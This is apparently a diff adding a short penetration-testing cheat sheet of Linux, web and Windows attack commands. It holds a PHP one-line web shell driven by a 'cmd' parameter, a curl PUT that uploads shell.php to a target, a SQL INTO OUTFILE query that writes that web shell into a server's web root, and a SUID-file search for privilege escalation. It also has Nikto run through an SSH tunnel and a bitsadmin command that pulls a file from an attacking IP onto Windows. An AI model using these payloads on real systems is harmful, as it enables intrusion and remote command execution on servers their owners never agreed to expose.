@@ -1,0 +1,25 @@
+find / -perm -4000 -exec ls -al -print 2>/dev/null {} \; = find all suid files in linux.
+
+So many times I've set up a netcat listener on a port, after creating shellcode or a msfvenom exe file only to remember that I need
+to use a multi/handler to catch the shell. 
+Msfconsole reports that the port is in use. Rather than recreate the shell, just kill the port using - *
+fuser -k port/tcp*
+
+
+<?php echo shell_exec($_GET['cmd']);?>* - If you can inject PHP, used this then call the vuln page with the cmd parameter. *
+page.php?cmd=id*
+
+
+Use curl to PUT a file into a web server
+curl -v -i -X PUT -H Content-Type: application/xml; charset=utf-8 -d @/root/source_file.txt http://Target_IP/shell.php
+
+Use SQL Query to create a shell file into a server
+
+Select "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
+
+*Using Nikto through SSH Tunnel*
+nikto -h http://ip.of.box.to.attack -useproxy http://localhost:8080 <port of the tunnel>
+
+
+Transfer a file from attacking box to Windows using cmd.exe on the Windows box -> 
+bitsadmin /transfer n http://attackingIP/file C:\folder\file*
